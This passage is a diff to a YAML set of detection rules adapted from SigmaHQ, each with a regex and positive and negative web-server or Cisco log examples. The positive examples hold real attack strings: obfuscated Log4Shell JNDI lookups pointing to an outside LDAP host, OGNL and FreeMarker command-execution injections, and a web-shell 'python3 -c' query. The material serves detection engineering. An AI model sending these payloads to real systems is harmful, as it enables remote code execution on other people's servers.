+      - '203.0.113.71 - - [21/Nov/2026:09:00:50 +0000] "GET /?x=${jndi:ldap://203.0.113.50:1389/WebsphereBypass/Upload/d2dldCBodHRw} HTTP/1.1" 400 0 "-" "-"'
     negative:
       - '10.0.3.8 - - [20/Nov/2026:15:19:00 +0000] "GET /docs/basic/commands.html HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
       - '10.0.3.8 - - [20/Nov/2026:15:20:00 +0000] "GET /api/deserialization/status HTTP/1.1" 200 12 "-" "kube-probe/1.29"'
@@ -1726,10 +1726,10 @@
   examples:
     positive:
       - '203.0.113.51 - - [20/Nov/2026:15:21:00 +0000] "GET /%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/ HTTP/1.1" 302 0 "-" "python-requests/2.31"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:04 +0000] "GET /index.jsp?q=%24%7B%28%23a%3D%40 HTTP/1.1" 400 0 "-" "-"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:05 +0000] "GET /index.jsp?q=${(#a=@ HTTP/1.1" 400 0 "-" "-"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:06 +0000] "GET /index.jsp?q=${@java HTTP/1.1" 400 0 "-" "-"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:07 +0000] "GET /index.jsp?q=%2F%24%7B%23 HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:34 +0000] "GET /%24%7B%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/ HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.51 - - [21/Nov/2026:09:01:35 +0000] "POST /struts2/upload.action HTTP/1.1" 200 0 "-" "-" body="queryString=aaa${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(\"id\").getInputStream(),\"utf-8\"))}"'
+      - '203.0.113.51 - - [21/Nov/2026:09:01:36 +0000] "POST /pages/createpage-entervariables.action HTTP/1.1" 200 0 "-" "-" body="queryString=${@java.lang.Runtime@getRuntime().exec(\"id\")}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:37 +0000] "GET /%2F%24%7B%23java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29%7D/ HTTP/1.1" 400 0 "-" "-"'
     negative:
       - '10.0.3.8 - - [20/Nov/2026:15:22:00 +0000] "GET /wiki/spaces/ENG/pages/123 HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
       - '2026-11-20 15:23:00 INFO  [main] java.lang.Runtime: available processors 8'
@@ -1737,7 +1737,7 @@
 - id: mention.sigma_java_payload_unicode_quote
   title: 'Unicode escape u0022 before a java.* class name (Sigma "Java Payload Strings")'
   match:
-    anchored: 'u0022java\.(?:lang|io|util|net|nio)\.'
+    anchored: 'u0022java\.lang\.(?:Runtime|ProcessBuilder|ProcessImpl)\b'
   case_sensitive: false
   strength: strong
   attack: [T1190]
@@ -1749,14 +1749,16 @@
     upstream_id: 583aa0a2-30b1-4d62-8bf3-ab73689efe6c
   rationale: >-
     The rule's 'u0022java' keyword with the class-name context it is there for: OGNL payloads against Confluence and
-    Struts escape the quote as \u0022 before java.lang.Runtime or java.io classes. The bare keyword is too short to
-    stand alone; JSON-escaped text that merely mentions java does not carry a package name after it.
+    Struts escape the quote as \u0022 before java.lang.Runtime or ProcessBuilder. The bare keyword is too short to
+    stand alone, and escaped class names in ordinary JSON error output (\u0022java.lang.NullPointerException) are
+    not matched.
   examples:
     positive:
       - '203.0.113.51 - - [20/Nov/2026:15:21:30 +0000] "GET /pages/x.action?q=%7B%40java.lang.Class%40forName(%5Cu0022java.lang.Runtime%5Cu0022) HTTP/1.1" 302 0 "-" "-" decoded="\u0022java.lang.Runtime\u0022"'
     negative:
       - '2026-11-20 15:21:31 INFO  [main] api: {"lang":"\u0022javascript\u0022"}'
       - '10.0.3.8 - - [20/Nov/2026:15:21:32 +0000] "GET /search?q=java HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+      - '2026-11-20 15:21:33 ERROR [api] {"error":"\u0022java.lang.NullPointerException\u0022"}'
 
 - id: mention.sigma_java_payload_short
   title: Short Java payload fragments (Sigma "Java Payload Strings")
@@ -1827,27 +1829,27 @@
     positive:
       - '203.0.113.52 - - [20/Nov/2026:15:27:00 +0000] "GET / HTTP/1.1" 200 812 "-" "${jndi:ldap://203.0.113.52:1389/a}"'
       - '2026-11-20 15:28:00 WARN  [http-nio-8080-exec-3] LoginController: failed login for user ${${lower:j}ndi:ldap://x.example.net/a}'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:08 +0000] "GET / HTTP/1.1" 200 0 "-" "${jndi:rmi:/x}"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:09 +0000] "GET / HTTP/1.1" 200 0 "-" "${jndi:ldaps:/x}"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:10 +0000] "GET / HTTP/1.1" 200 0 "-" "${jndi:dns:/x}"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:11 +0000] "GET / HTTP/1.1" 200 0 "-" "/$%7bjndi:x}"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:12 +0000] "GET / HTTP/1.1" 200 0 "-" "%24%7bjndi:x}"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:13 +0000] "GET / HTTP/1.1" 200 0 "-" "$%7Bjndi:x}"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:14 +0000] "GET / HTTP/1.1" 200 0 "-" "%2524%257Bjndix}"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:15 +0000] "GET / HTTP/1.1" 200 0 "-" "%2F%252524%25257Bjndi%3Ax}"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:16 +0000] "GET / HTTP/1.1" 200 0 "-" "${jndi:${lower:x}"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:17 +0000] "GET / HTTP/1.1" 200 0 "-" "${::-j}${x}"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:18 +0000] "GET / HTTP/1.1" 200 0 "-" "${jndi:nisx}"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:19 +0000] "GET / HTTP/1.1" 200 0 "-" "${jndi:ndsx}"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:20 +0000] "GET / HTTP/1.1" 200 0 "-" "${jndi:corbax}"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:21 +0000] "GET / HTTP/1.1" 200 0 "-" "${jndi:iiopx}"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:22 +0000] "GET / HTTP/1.1" 200 0 "-" "Reference Class Name: foox}"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:23 +0000] "GET / HTTP/1.1" 200 0 "-" "${${env:BARFOO:-j}x}"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:24 +0000] "GET / HTTP/1.1" 200 0 "-" "${::-l}${::-d}${::-a}${::-p}x}"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:25 +0000] "GET / HTTP/1.1" 200 0 "-" "${base64:JHtqbmRpx}"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:26 +0000] "GET / HTTP/1.1" 200 0 "-" "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$x}"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:27 +0000] "GET / HTTP/1.1" 200 0 "-" "${${upper:j}ndi:x}"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:28 +0000] "GET / HTTP/1.1" 200 0 "-" "${${::-j}${::-n}${::-d}${::-i}:x}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:51 +0000] "GET / HTTP/1.1" 400 0 "-" "${jndi:rmi://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:52 +0000] "GET / HTTP/1.1" 400 0 "-" "${jndi:ldaps://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:53 +0000] "GET / HTTP/1.1" 400 0 "-" "${jndi:dns://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:54 +0000] "GET / HTTP/1.1" 400 0 "-" "/$%7bjndi:ldap://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:55 +0000] "GET / HTTP/1.1" 400 0 "-" "%24%7bjndi:ldap://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:56 +0000] "GET / HTTP/1.1" 400 0 "-" "$%7Bjndi:ldap://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:57 +0000] "GET / HTTP/1.1" 400 0 "-" "%2524%257Bjndi://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:58 +0000] "GET / HTTP/1.1" 400 0 "-" "%2F%252524%25257Bjndi%3A://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:00:59 +0000] "GET / HTTP/1.1" 400 0 "-" "${jndi:${lower:ldap://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:00 +0000] "GET / HTTP/1.1" 400 0 "-" "${::-j}${ldap://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:01 +0000] "GET / HTTP/1.1" 400 0 "-" "${jndi:nis://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:02 +0000] "GET / HTTP/1.1" 400 0 "-" "${jndi:nds://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:03 +0000] "GET / HTTP/1.1" 400 0 "-" "${jndi:corba://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:04 +0000] "GET / HTTP/1.1" 400 0 "-" "${jndi:iiop://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:05 +0000] "GET / HTTP/1.1" 400 0 "-" "Reference Class Name: foo://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:06 +0000] "GET / HTTP/1.1" 400 0 "-" "${${env:BARFOO:-j}x://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:07 +0000] "GET / HTTP/1.1" 400 0 "-" "${::-l}${::-d}${::-a}${::-p}x://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:08 +0000] "GET / HTTP/1.1" 400 0 "-" "${base64:JHtqbmRp://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:09 +0000] "GET / HTTP/1.1" 400 0 "-" "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}$ldap://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:10 +0000] "GET / HTTP/1.1" 400 0 "-" "${${upper:j}ndi:ldap://203.0.113.52:1389/a}"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:11 +0000] "GET / HTTP/1.1" 400 0 "-" "${${::-j}${::-n}${::-d}${::-i}:ldap://203.0.113.52:1389/a}"'
     negative:
       - '2026-11-20 15:29:00 INFO  [main] org.apache.catalina.core.NamingContextListener: Creating JNDI naming context'
       - '10.0.3.8 - - [20/Nov/2026:15:30:00 +0000] "GET /config?template=${user.home} HTTP/1.1" 200 12 "-" "Mozilla/5.0"'
@@ -2062,8 +2064,8 @@
   examples:
     positive:
       - '203.0.113.53 - - [20/Nov/2026:15:55:00 +0000] "GET /preview?t=<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")} HTTP/1.1" 200 12 "-" "-"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:29 +0000] "GET /index.jsp?q=.getClass().forName(''javax.script.ScriptEngineManager'') HTTP/1.1" 400 0 "-" "-"'
-      - '203.0.113.71 - - [21/Nov/2026:09:02:30 +0000] "GET /index.jsp?q=T(org.apache.commons.io.IOUtils) HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:01:59 +0000] "GET /preview?t=${.getClass().forName(''javax.script.ScriptEngineManager'').toString()} HTTP/1.1" 400 0 "-" "-"'
+      - '203.0.113.71 - - [21/Nov/2026:09:02:00 +0000] "GET /preview?t=${T(org.apache.commons.io.IOUtils).toString()} HTTP/1.1" 400 0 "-" "-"'
     negative:
       - '10.0.3.8 - - [20/Nov/2026:15:56:00 +0000] "GET /docs/freemarker/template-guide HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
       - '2026-11-20 15:57:00 INFO  [main] freemarker.cache: Template loaded: welcome.ftl'
@@ -2196,6 +2198,29 @@
       - '10.0.3.8 - - [20/Nov/2026:16:08:00 +0000] "GET /search?q=python HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
       - '10.0.3.8 - - [20/Nov/2026:16:09:00 +0000] "GET /kb?topic=sshd_config HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
 
+- id: mention.sigma_webshell_query_python_c
+  title: python -c as a URL parameter value (Sigma "Windows Webshell Strings")
+  match:
+    anchored: '=python[0-9.]{0,4}(?:%20|\+)-c(?:%20|\+)'
+  case_sensitive: false
+  strength: medium
+  attack: [T1505.003, T1059.006]
+  telemetry: [any]
+  source:
+    name: 'SigmaHQ: Windows Webshell Strings (Florian Roth, Nasreddine Bencherchali, Nextron Systems)'
+    url: https://github.com/SigmaHQ/sigma/blob/698f0912f571d5fac3bf8c51f5421139834a011c/rules/web/webserver_generic/web_win_webshells_in_access_logs.yml
+    license: DRL-1.1
+    upstream_id: 7ff9db12-1b94-4a79-ba68-a2402c5d6729
+  rationale: >-
+    The rule's '=python+' keyword narrowed to a value that continues with -c: inline Python code passed to a web
+    shell. Searches rarely contain 'python -c', so it is medium.
+  examples:
+    positive:
+      - '203.0.113.54 - - [20/Nov/2026:16:07:03 +0000] "GET /up/x.php?cmd=python3+-c+import+os HTTP/1.1" 200 0 "-" "-"'
+    negative:
+      - '10.0.3.8 - - [20/Nov/2026:16:07:04 +0000] "GET /search?q=python+tutorial HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+      - '10.0.3.8 - - [20/Nov/2026:16:07:05 +0000] "GET /kb?topic=python+-+classes HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
+
 - id: mention.sigma_webshell_query_curl_url
   title: curl with a URL as a URL parameter value (Sigma "Windows Webshell Strings")
   match:
@@ -2243,7 +2268,7 @@
       - '10.0.3.8 - - [20/Nov/2026:16:07:02 +0000] "GET /kb?topic=wget%20options HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
 
 - id: mention.sigma_git_internals_request
-  title: 'GET request line for .git internals (narrowing of Sigma "Source Code Enumeration Detection by Keyword")'
+  title: 'GET request line for .git internals (narrow form of Sigma "Source Code Enumeration Detection by Keyword")'
   match:
     anchored: 'GET /[^ \n]{0,200}\.git/(?:config|HEAD|index|logs/HEAD|ORIG_HEAD|packed-refs)'
   case_sensitive: false
@@ -2267,7 +2292,7 @@
       - '10.0.3.8 - - [20/Nov/2026:16:12:00 +0000] "GET /docs/git/config.html HTTP/1.1" 200 812 "-" "Mozilla/5.0"'
 
 - id: mention.sigma_cisco_clear_logs
-  title: 'Cisco clear logging or clear archive command text (Sigma "Cisco Clear Logs")'
+  title: 'Cisco ''clear logging'' or ''clear archive'' command text (Sigma "Cisco Clear Logs")'
   match:
     literal: ['clear logging', 'clear archive']
   case_sensitive: false
@@ -2529,7 +2554,7 @@
       - 'Nov 20 16:45:00 rtr01 %PARSER-5-CFGLOG_LOGGEDCMD: User:netadmin logged command:ip ssh version 2'
 
 - id: mention.sigma_cisco_config_dump
-  title: 'Cisco show running-config or startup-config command text (Sigma "Cisco Collect Data")'
+  title: 'Cisco ''show running-config'' or ''show startup-config'' command text (Sigma "Cisco Collect Data")'
   match:
     literal: ['show running-config', 'show startup-config', 'show archive config']
   case_sensitive: false
